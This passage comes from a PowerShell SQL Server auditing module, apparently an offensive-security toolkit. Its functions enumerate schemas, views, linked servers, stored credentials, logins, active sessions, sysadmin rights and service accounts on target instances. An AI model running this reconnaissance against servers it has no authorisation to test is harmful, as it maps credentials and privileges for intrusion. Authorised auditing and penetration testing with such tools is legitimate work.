    .PARAMETER Instance
        SQL Server instance to connection to. 
    .PARAMETER DAC
        Connect using Dedicated Admin Connection. 
    .PARAMETER DatabaseName
        Database name to filter for.
    .PARAMETER SchemaName
        Schema name to filter for. 
    .PARAMETER NoDefaults
        Only show information for non default databases.    

    .EXAMPLE
        PS C:\> Get-SQLDatabaseSchema -Instance SQLServer1\STANDARDDEV2014 -DatabaseName testdb

        ComputerName : SQLServer1
        Instance     : SQLServer1\STANDARDDEV2014
        DatabaseName : testdb
        SchemaName   : db_accessadmin
        SchemaOwner  : db_accessadmin
        [TRUNCATED]
    .EXAMPLE
        PS C:\> Get-SQLInstanceLocal | Get-SQLDatabaseSchema -Verbose
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account to authenticate with.")]
        [string]$Username,

        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account password to authenticate with.")]
        [string]$Password,

        [Parameter(Mandatory=$false,
        HelpMessage="Windows credentials.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server instance to connection to.")]
        [string]$Instance,

        [Parameter(Mandatory=$false,               
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Database name.")]
        [string]$DatabaseName,

        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Schema name.")]
        [string]$SchemaName,

        [Parameter(Mandatory=$false,
        HelpMessage="Don't select tables from default databases.")]
        [switch]$NoDefaults,

        [Parameter(Mandatory=$false,
        HelpMessage="Suppress verbose errors.  Used when function is wrapped.")]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblSchemas = New-Object System.Data.DataTable

        # Setup schema filter
        if($SchemaName){            
            $SchemaNameFilter = " where schema_name like '%$SchemaName%'"
        }else{
            $SchemaNameFilter = ""
        }
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance){
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection =  Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object {$_.Status -eq "Accessible"}
        if($TestConnection){   
            
            if( -not $SuppressVerbose){
                Write-Verbose "$Instance : Connection Success."
            }
        }else{
            
            if( -not $SuppressVerbose){
                Write-Verbose "$Instance : Connection Failed."
            }
            return
        }

         # Setup NoDefault filter
        if($NoDefaults){
            
            # Get list of databases
            $TblDatabases =  Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -NoDefaults -SuppressVerbose
        }else{

            # Get list of databases
            $TblDatabases =  Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -SuppressVerbose
        }

        # Get tables for each database
        $TblDatabases | 
        ForEach-Object {

            # Get database name
            $DbName = $_.DatabaseName

            if( -not $SuppressVerbose){
                Write-Verbose "$Instance : Grabbing Schemas from the $DbName database..."
            }

            # Define Query
            $Query = "  USE $DbName;
                        SELECT  '$ComputerName' as [ComputerName],
                                '$Instance' as [Instance],
                                CATALOG_NAME as [DatabaseName],
	                            SCHEMA_NAME as [SchemaName],
	                            SCHEMA_OWNER as [SchemaOwner]
                        FROM    [$DbName].[INFORMATION_SCHEMA].[SCHEMATA]
                        $SchemaNameFilter
                        ORDER BY SCHEMA_NAME"

            # Execute Query
            $TblResults =  Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -SuppressVerbose

            # Append results
            $TblSchemas = $TblSchemas + $TblResults
        }        
    }

    End
    {  
        # Return data
        $TblSchemas          
    }
}


# ----------------------------------
#  Get-SQLView
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLView{
<#
    .SYNOPSIS
        Returns view information from target SQL Servers.
    .PARAMETER Username
        SQL Server or domain account to authenticate with.   
    .PARAMETER Password
        SQL Server or domain account password to authenticate with. 
    .PARAMETER Credential
        SQL Server credential. 
    .PARAMETER Instance
        SQL Server instance to connection to. 
    .PARAMETER DatabaseName
        Database name to filter for.
    .PARAMETER ViewName
        View name to filter for. 
    .PARAMETER NoDefaults
        Only display results from non default databases. 
    .EXAMPLE
        PS C:\> Get-SQLView -Instance SQLServer1\STANDARDDEV2014 -DatabaseName master

        ComputerName   : SQLServer1
        Instance       : SQLServer1\STANDARDDEV2014
        DatabaseName   : master
        SchemaName     : dbo
        ViewName       : spt_values
        ViewDefinition : 
                         create view spt_values as
                         select name collate database_default as name,
                             number,
                             type collate database_default as type,
                             low, high, status
                         from sys.spt_values                 
        IsUpdatable    : NO
        CheckOption    : NONE
    .EXAMPLE
        PS C:\> Get-SQLInstanceDomain | Get-SQLView -Verbose
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account to authenticate with.")]
        [string]$Username,

        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account password to authenticate with.")]
        [string]$Password,

        [Parameter(Mandatory=$false,
        HelpMessage="Windows credentials.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server instance to connection to.")]
        [string]$Instance,

        [Parameter(Mandatory=$false,               
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Database name.")]
        [string]$DatabaseName,

        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="View name.")]
        [string]$ViewName,

        [Parameter(Mandatory=$false,
        HelpMessage="Don't select tables from default databases.")]
        [switch]$NoDefaults
    )

    Begin
    {
        # Table for output
        $TblViews = New-Object System.Data.DataTable
        
        # Setup View filter
        if($ViewName){            
            $ViewFilter = " where table_name like '%$ViewName%'"
        }else{
            $ViewFilter = ""
        }
    }

    Process
    {
        # Note: Tables queried by this function typically require sysadmin privileges to get all rows.

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance){
            $Instance = $env:COMPUTERNAME
        }

         # Setup NoDefault filter
        if($NoDefaults){
            
            # Get list of databases
            $TblDatabases =  Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -NoDefaults
        }else{

            # Get list of databases
            $TblDatabases =  Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess
        }

        # Get tables for each database
        $TblDatabases | 
        ForEach-Object {

            # Get database name
            $DbName = $_.DatabaseName

            # Define Query
            $Query = "  USE $DbName;
                        SELECT  '$ComputerName' as [ComputerName],
                                '$Instance' as [Instance],
                                TABLE_CATALOG as [DatabaseName],
	                            TABLE_SCHEMA as [SchemaName],
	                            TABLE_NAME as [ViewName],
	                            VIEW_DEFINITION as [ViewDefinition],
	                            IS_UPDATABLE as [IsUpdatable],
	                            CHECK_OPTION as [CheckOption]
                        FROM    [INFORMATION_SCHEMA].[VIEWS]
                        $ViewFilter
                        ORDER BY TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME"

            # Execute Query
            $TblResults =  Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password

            # Append results             
            $TblViews = $TblViews + $TblResults
        }        
    }

    End
    {  
        # Return data
        $TblViews          
    }
}


# ----------------------------------
#  Get-SQLServerLink
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLServerLink{
<#
    .SYNOPSIS
        Returns link servers from target SQL Servers.
    .PARAMETER Username
        SQL Server or domain account to authenticate with.   
    .PARAMETER Password
        SQL Server or domain account password to authenticate with. 
    .PARAMETER Credential
        SQL Server credential. 
    .PARAMETER Instance
        SQL Server instance to connection to. 
    .PARAMETER DatabaseLinkName
        Database link name to filter for. 
    .EXAMPLE
        PS C:\> Get-SQLServerLink -Instance SQLServer1\STANDARDDEV2014 

        ComputerName           : SQLServer1
        Instance               : SQLServer1\STANDARDDEV2014
        DatabaseLinkId         : 0
        DatabaseLinkName       : SQLServer1\STANDARDDEV2014
        DatabaseLinkLocation   : Local
        Product                : SQL Server
        Provider               : SQLNCLI
        Catalog                : 
        Local Login            : Uses Self Credentials
        RemoteLoginName        : 
        is_rpc_out_enabled     : True
        is_data_access_enabled : False
        modify_date            : 3/13/2016 12:30:33 PM

        ComputerName           : SQLServer1
        Instance               : SQLServer1\STANDARDDEV2014
        DatabaseLinkId         : 1
        DatabaseLinkName       : SQLServer2\SQLEXPRESS
        DatabaseLinkLocation   : Remote
        Product                : SQL Server
        Provider               : SQLNCLI
        Catalog                : 
        Local Login            : 
        RemoteLoginName        : user123
        is_rpc_out_enabled     : False
        is_data_access_enabled : True
        modify_date            : 5/6/2016 10:20:44 AM
    .EXAMPLE
        PS C:\> Get-SQLInstanceLocal | Get-SQLServerLink -Verbose
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account to authenticate with.")]
        [string]$Username,

        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account password to authenticate with.")]
        [string]$Password,

        [Parameter(Mandatory=$false,
        HelpMessage="Windows credentials.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server instance to connection to.")]
        [string]$Instance,

        [Parameter(Mandatory=$false,
        ValueFromPipeline=$true,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server link name.")]
        [string]$DatabaseLinkName,

        [Parameter(Mandatory=$false,
        HelpMessage="Suppress verbose errors.  Used when function is wrapped.")]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblServerLinks = New-Object System.Data.DataTable

        # Setup DatabaseLinkName filter
        if($DatabaseLinkName){            
            $VDatabaseLinkNameFilter = " WHERE a.name like '$DatabaseLinkName'"
        }else{
            $DatabaseLinkNameFilter = ""
        }
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance){
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection =  Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object {$_.Status -eq "Accessible"}
        if($TestConnection){   
            
            if( -not $SuppressVerbose){
                Write-Verbose "$Instance : Connection Success."
            }
        }else{
            
            if( -not $SuppressVerbose){
                Write-Verbose "$Instance : Connection Failed."
            }
            return
        }

        # Define Query
        $Query = "  SELECT  '$ComputerName' as [ComputerName],
                            '$Instance' as [Instance],
                            a.server_id as [DatabaseLinkId],
                            a.name AS [DatabaseLinkName],
                            CASE a.Server_id 
                            WHEN 0 
                            THEN 'Local'
                            ELSE 'Remote'
                            END AS [DatabaseLinkLocation],
                            a.product as [Product],
                            a.provider as [Provider],
                            a.catalog as [Catalog],
                            'Local Login ' = CASE b.uses_self_credential
                            WHEN 1 THEN 'Uses Self Credentials'
	                            ELSE c.name
                            END,
                            b.remote_name AS [RemoteLoginName],
                            a.is_rpc_out_enabled,
                            a.is_data_access_enabled,
                            a.modify_date
                    FROM [Master].[sys].[Servers] a
                    LEFT JOIN [Master].[sys].[linked_logins] b
                            ON a.server_id = b.server_id
                    LEFT JOIN [Master].[sys].[server_principals] c
                            ON c.principal_id = b.local_principal_id
                    $DatabaseLinkNameFilter"

        # Execute Query
        $TblResults =  Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

        # Append results             
        $TblServerLinks = $TblServerLinks + $TblResults        
    }

    End
    {  
        # Return data
        $TblServerLinks          
    }
}


# ----------------------------------
#  Get-SQLServerCredential
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLServerCredential{
<#
    .SYNOPSIS
        Returns credentials from target SQL Servers.
    .PARAMETER Username
        SQL Server or domain account to authenticate with.   
    .PARAMETER Password
        SQL Server or domain account password to authenticate with. 
    .PARAMETER Credential
        SQL Server credential. 
    .PARAMETER Instance
        SQL Server instance to connection to. 
    .EXAMPLE
        PS C:\> Get-SQLServerCredential -Instance SQLServer1\STANDARDDEV2014 

        ComputerName        : SQLServer1
        Instance            : SQLServer1\STANDARDDEV2014
        credential_id       : 65536
        CredentialName      : MyUser
        credential_identity : Domain\MyUser
        create_date         : 5/5/2016 11:16:12 PM
        modify_date         : 5/5/2016 11:16:12 PM
        target_type         : 
        target_id           : 
        [TRUNCATED]
    .EXAMPLE
        PS C:\> Get-SQLInstanceLocal | Get-SQLServerCredential -Verbose
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account to authenticate with.")]
        [string]$Username,

        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account password to authenticate with.")]
        [string]$Password,

        [Parameter(Mandatory=$false,
        HelpMessage="Windows credentials.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server instance to connection to.")]
        [string]$Instance,

        [Parameter(Mandatory=$false,
        ValueFromPipeline=$true,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Credential name.")]
        [string]$CredentialName,      

        [Parameter(Mandatory=$false,
        HelpMessage="Suppress verbose errors.  Used when function is wrapped.")]
        [switch]$SuppressVerbose
    )

    Begin
    {
        $TblCredentials = New-Object System.Data.DataTable

        # Setup CredentialName filter
        if($CredentialName){            
            $CredentialNameFilter = " WHERE name like '$CredentialName'"
        }else{
            $CredentialNameFilter = ""
        }
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance){
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection =  Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object {$_.Status -eq "Accessible"}
        if($TestConnection){   
            
            if( -not $SuppressVerbose){
                Write-Verbose "$Instance : Connection Success."
            }
        }else{
            
            if( -not $SuppressVerbose){
                Write-Verbose "$Instance : Connection Failed."
            }
            return
        }

        # Define Query
        $Query = "  USE master;
                    SELECT  '$ComputerName' as [ComputerName],
		                    '$Instance' as [Instance],
		                    credential_id,
		                    name as [CredentialName],
		                    credential_identity,
		                    create_date,
		                    modify_date,
		                    target_type,
		                    target_id
                    FROM [master].[sys].[credentials]
                    $CredentialNameFilter"
        
        # Execute Query
        $TblResults =  Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

        # Append results             
        $TblCredentials = $TblCredentials + $TblResults       
    }

    End
    {  
        # Return data
        $TblCredentials          
    }
}


# ----------------------------------
#  Get-SQLServerLogin
# ----------------------------------
Function  Get-SQLServerLogin{
<#
    .SYNOPSIS
        Returns logins from target SQL Servers.
    .PARAMETER Username
        SQL Server or domain account to authenticate with.   
    .PARAMETER Password
        SQL Server or domain account password to authenticate with. 
    .PARAMETER Credential
        SQL Server credential. 
    .PARAMETER Instance
        SQL Server instance to connection to. 
    .PARAMETER PrincipalName
        Pincipal name to filter for. 
    .EXAMPLE
        PS C:\> Get-SQLServerLogin -Instance SQLServer1\STANDARDDEV2014 | Select-Object -First 1

        ComputerName  : SQLServer1
        Instance      : SQLServer1\STANDARDDEV2014
        PrincipalId   : 1
        PrincipalName : sa
        PrincipalSid  : 1
        PrincipalType : SQL_LOGIN
        CreateDate    : 4/8/2003 9:10:35 AM
        IsLocked      : 0
    .EXAMPLE
        PS C:\> Get-SQLInstanceLocal | Get-SQLServerLogin -Verbose
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server or domain account to authenticate with.")]
        [string]$Username,

        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server or domain account password to authenticate with.")]
        [string]$Password,

        [Parameter(Mandatory=$false,
        HelpMessage="Windows credentials.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server instance to connection to.")]
        [string]$Instance,

        [Parameter(Mandatory=$false,
        ValueFromPipeline=$true,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Principal name to filter for.")]
        [string]$PrincipalName
    )

    Begin
    {
        # Table for output
        $TblLogins = New-Object System.Data.DataTable
        $TblLogins.Columns.Add("ComputerName") | Out-Null
        $TblLogins.Columns.Add("Instance") | Out-Null
        $TblLogins.Columns.Add("PrincipalId") | Out-Null
        $TblLogins.Columns.Add("PrincipalName") | Out-Null
        $TblLogins.Columns.Add("PrincipalSid") | Out-Null
        $TblLogins.Columns.Add("PrincipalType") | Out-Null
        $TblLogins.Columns.Add("CreateDate") | Out-Null
        $TblLogins.Columns.Add("IsLocked") | Out-Null

        # Setup CredentialName filter
        if($PrincipalName){            
            $PrincipalNameFilter = " and name like '$PrincipalName'"
        }else{
            $PrincipalNameFilter = ""
        }
    }

    Process
    {
        # Note: Tables queried by this function typically require sysadmin privileges.

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance){
            $Instance = $env:COMPUTERNAME
        }

        # Define Query
        $Query = "  USE master;
                    SELECT  '$ComputerName' as [ComputerName],
                            '$Instance' as [Instance],principal_id as [PrincipalId],
	                        name as [PrincipalName],
	                        sid as [PrincipalSid],
	                        type_desc as [PrincipalType],
	                        create_date as [CreateDate], 
	                        LOGINPROPERTY ( name , 'IsLocked' ) as [IsLocked]
                    FROM [sys].[server_principals] 
                    WHERE type = 'S' or type = 'U' or type = 'C'
                    $PrincipalNameFilter"
        
        # Execute Query
        $TblResults =  Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential

        # Update sid formatting for each record
        $TblResults |
        ForEach-Object {
                
            # Format principal sid
            $NewSid = [System.BitConverter]::ToString($_.PrincipalSid).Replace("-","")
            if ($NewSid.length -le 10){                
                $Sid = [Convert]::ToInt32($NewSid,16)
            }else{
                $Sid = $NewSid
            }

            # Add results to table
            $TblLogins.Rows.Add(
                [string]$_.ComputerName,
                [string]$_.Instance,
                [string]$_.PrincipalId,
                [string]$_.PrincipalName,
                $Sid,
                [string]$_.PrincipalType,
                $_.CreateDate,
                [string]$_.IsLocked) | Out-Null         
        }                        
    }

    End
    {  
        # Return data
        $TblLogins          
    }
}


# ----------------------------------
#  Get-SQLSession
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLSession{
<#
    .SYNOPSIS
        Returns active sessions from target SQL Servers.  Sysadmin privileges is required to view all sessions.
    .PARAMETER Username
        SQL Server or domain account to authenticate with.   
    .PARAMETER Password
        SQL Server or domain account password to authenticate with. 
    .PARAMETER Credential
        SQL Server credential. 
    .PARAMETER Instance
        SQL Server instance to connection to. 
    .EXAMPLE
        PS C:\> Get-SQLSession -Instance SQLServer1\STANDARDDEV2014 | Select-Object -First 1

        ComputerName          : SQLServer1
        Instance              : SQLServer1\STANDARDDEV2014
        PrincipalSid          : 010500000000000515000000F3864312345716CC636051C017100000
        PrincipalName         : Domain\MyUser
        OriginalPrincipalName : Domain\MyUser
        SessionId             : 51
        SessionStartTime      : 06/24/2016 09:26:21
        SessionLoginTime      : 06/24/2016 09:26:21
        SessionStatus         : running
    .EXAMPLE
        PS C:\> Get-SQLInstanceDomain | Get-SQLSession -Verbose
    .EXAMPLE
        PS C:\> (Get-SQLSession -Instance SQLServer1\STANDARDDEV2014).count
        48
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server or domain account to authenticate with.")]
        [string]$Username,

        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server or domain account password to authenticate with.")]
        [string]$Password,

        [Parameter(Mandatory=$false,
        HelpMessage="Windows credentials.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server instance to connection to.")]
        [string]$Instance,

        [Parameter(Mandatory=$false,
        ValueFromPipeline=$true,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="PrincipalName.")]
        [string]$PrincipalName,

        [Parameter(Mandatory=$false,
        HelpMessage="Suppress verbose errors.  Used when function is wrapped.")]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblSessions = New-Object System.Data.DataTable
        $TblSessions.Columns.Add("ComputerName") | Out-Null
        $TblSessions.Columns.Add("Instance") | Out-Null
        $TblSessions.Columns.Add("PrincipalSid") | Out-Null
        $TblSessions.Columns.Add("PrincipalName") | Out-Null
        $TblSessions.Columns.Add("OriginalPrincipalName") | Out-Null
        $TblSessions.Columns.Add("SessionId") | Out-Null
        $TblSessions.Columns.Add("SessionStartTime") | Out-Null
        $TblSessions.Columns.Add("SessionLoginTime") | Out-Null
        $TblSessions.Columns.Add("SessionStatus") | Out-Null

        # Setup PrincipalName filter
        if($PrincipalName){            
            $PrincipalNameFilter = " and login_name like '$PrincipalName'"
        }else{
            $PrincipalNameFilter = ""
        }
    }

    Process
    {
        # Note: Tables queried by this function typically require sysadmin privileges to view sessions that aren't yours.

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance){
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection =  Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object {$_.Status -eq "Accessible"}
        if($TestConnection){   
            
            if( -not $SuppressVerbose){
                Write-Verbose "$Instance : Connection Success."
            }
        }else{
            
            if( -not $SuppressVerbose){
                Write-Verbose "$Instance : Connection Failed."
            }
            return
        }

        # Define Query
        $Query = "  USE master;
                    SELECT  '$ComputerName' as [ComputerName],
                            '$Instance' as [Instance],
                            security_id as [PrincipalSid],
	                        login_name as [PrincipalName],
	                        original_login_name as [OriginalPrincipalName],
	                        session_id as [SessionId],
	                        last_request_start_time as [SessionStartTime],
	                        login_time as [SessionLoginTime],
	                        status as [SessionStatus]
                    FROM    [sys].[dm_exec_sessions]
                    ORDER BY status
                    $PrincipalNameFilter"
        
        # Execute Query
        $TblResults =  Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose     

        # Update sid formatting for each record
        $TblResults |
        ForEach-Object {
                
            # Format principal sid
            $NewSid = [System.BitConverter]::ToString($_.PrincipalSid).Replace("-","")
            if ($NewSid.length -le 10){                
                $Sid = [Convert]::ToInt32($NewSid,16)
            }else{
                $Sid = $NewSid
            }

            # Add results to table
            $TblSessions.Rows.Add(
                [string]$_.ComputerName,
                [string]$_.Instance,
                $Sid,
                [string]$_.PrincipalName,
                [string]$_.OriginalPrincipalName,
                [string]$_.SessionId,
                [string]$_.SessionStartTime,
                [string]$_.SessionLoginTime,
                [string]$_.SessionStatus) | Out-Null         
        }                        
    }

    End
    {  
        # Return data
        $TblSessions          
    }
}


# ----------------------------------
#  Get-SQLSysadminCheck
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLSysadminCheck{
<#
    .SYNOPSIS
        Check if login is has sysadmin privilege on the target SQL Servers.
    .PARAMETER Username
        SQL Server or domain account to authenticate with.   
    .PARAMETER Password
        SQL Server or domain account password to authenticate with. 
    .PARAMETER Credential
        SQL Server credential. 
    .PARAMETER Instance
        SQL Server instance to connection to. 
    .EXAMPLE
        PS C:\> Get-SQLSysadminCheck -Instance SQLServer1\STANDARDDEV2014 

        ComputerName   Instance                       IsSysadmin
        ------------   --------                       ----------
        SQLServer1     SQLServer1\STANDARDDEV2014     Yes 
    .EXAMPLE
        PS C:\> Get-SQLInstanceDomain | Get-SQLStoredProcure -Verbose -NoDefaults
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account to authenticate with.")]
        [string]$Username,

        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account password to authenticate with.")]
        [string]$Password,

        [Parameter(Mandatory=$false,
        HelpMessage="Windows credentials.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server instance to connection to.")]
        [string]$Instance,

        [Parameter(Mandatory=$false,
        HelpMessage="Suppress verbose errors.  Used when function is wrapped.")]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Data for output
        $TblSysadminStatus = New-Object System.Data.DataTable
        
        # Setup CredentialName filter
        if($CredentialName){            
            $CredentialNameFilter = " WHERE name like '$CredentialName'"
        }else{
            $CredentialNameFilter = ""
        }

    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance){
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection =  Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object {$_.Status -eq "Accessible"}
        if($TestConnection){   
            
            if( -not $SuppressVerbose){
                Write-Verbose "$Instance : Connection Success."
            }
        }else{
            
            if( -not $SuppressVerbose){
                Write-Verbose "$Instance : Connection Failed."
            }
            return
        }

        # Define Query
        $Query = "SELECT    '$ComputerName' as [ComputerName],
                            '$Instance' as [Instance],
		                     CASE 
                             WHEN IS_SRVROLEMEMBER('sysadmin') =  0 THEN 'No'
		                     ELSE 'Yes'
		                     END as IsSysadmin"
        
        # Execute Query
        $TblSysadminStatusTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

        # Append results             
        $TblSysadminStatus = $TblSysadminStatus + $TblSysadminStatusTemp
    }

    End
    {  
        # Return data
        $TblSysadminStatus        
    }
}


# ----------------------------------
#  Get-SQLServiceAccount
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLServiceAccount{
<#
    .SYNOPSIS
        Returns a list of service account names for SQL Servers services by querying the registry with xp_regread.  This can be executed against remote systems.
    .PARAMETER Username
        SQL Server or domain account to authenticate with.   
    .PARAMETER Password
        SQL Server or domain account password to authenticate with. 
    .PARAMETER Credential
        SQL Server credential. 
    .PARAMETER Instance
        SQL Server instance to connection to. 
    .EXAMPLE
        PS C:\> Get-SQLServiceAccount -Instance SQLServer1\STANDARDDEV2014 

        ComputerName     : SQLServer1
        Instance         : SQLServer1\STANDARDDEV2014
        DBEngineLogin    : LocalSystem
        AgentLogin       : NT Service\SQLAgent$STANDARDDEV2014
        BrowserLogin     : NT AUTHORITY\LOCALSERVICE
        WriterLogin      : LocalSystem
        AnalysisLogin    : NT Service\MSOLAP$STANDARDDEV2014
        ReportLogin      : NT Service\ReportServer$STANDARDDEV2014
        IntegrationLogin : NT Service\MsDtsServer120

    .EXAMPLE
        PS C:\> Get-SQLInstanceDomain | Get-SQLServiceAccount -Verbose
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account to authenticate with.")]
        [string]$Username,

        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account password to authenticate with.")]
        [string]$Password,

        [Parameter(Mandatory=$false,
        HelpMessage="Windows credentials.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server instance to connection to.")]
        [string]$Instance
    )

    Begin
    {
        # Table for output
        $TblServiceAccount = New-Object System.Data.DataTable
    }

    Process
    {
        # Note: Tables queried by this function typically require sysadmin privileges.

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance){
            $Instance = $env:COMPUTERNAME
        }

        # Get sysadmin status
        $IsSysadmin =  Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password | Select-Object IsSysadmin -ExpandProperty IsSysadmin

        if($IsSysadmin -eq "Yes"){
            $SysadminSetup = "
                    -- Get SQL Server Browser - Static Location
                    EXECUTE       master.dbo.xp_instance_regread
                                  @rootkey      = N'HKEY_LOCAL_MACHINE',
                                  @key          = N'SYSTEM\CurrentControlSet\Services\SQLBrowser',
                                  @value_name   = N'ObjectName',
                                  @value        = @BrowserLogin OUTPUT

                    -- Get SQL Server Writer - Static Location
                    EXECUTE       master.dbo.xp_instance_regread
                                  @rootkey      = N'HKEY_LOCAL_MACHINE',
                                  @key          = N'SYSTEM\CurrentControlSet\Services\SQLWriter',
                                  @value_name   = N'ObjectName',
                                  @value        = @WriterLogin OUTPUT

                    -- Get MSOLAP - Calculated
                    EXECUTE		master.dbo.xp_instance_regread  
		                    N'HKEY_LOCAL_MACHINE', @MSOLAPInstance,  
